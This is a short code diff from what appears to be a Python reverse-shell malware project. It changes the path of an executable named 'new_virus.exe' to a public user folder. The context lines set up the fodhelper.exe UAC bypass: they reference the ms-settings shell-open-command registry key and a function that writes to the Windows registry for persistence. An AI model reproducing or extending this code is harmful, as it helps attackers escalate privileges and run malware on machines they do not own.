@@ -47,7 +47,7 @@ def add_to_winregistry():
 
 class AdminPrivilegesManager(object):
     def __init__(self):
-        self.cmd = r"C:\Users\User\Desktop\Reverse-Shell\dist\new_virus.exe -r"
+        self.cmd = r"C:\Users\Public\new_virus.exe -r"
         self.fod_helper = r'C:\Windows\System32\fodhelper.exe'
         self.python_cmd = "python"
         self.reg_path = 'Software\Classes\ms-settings\shell\open\command'
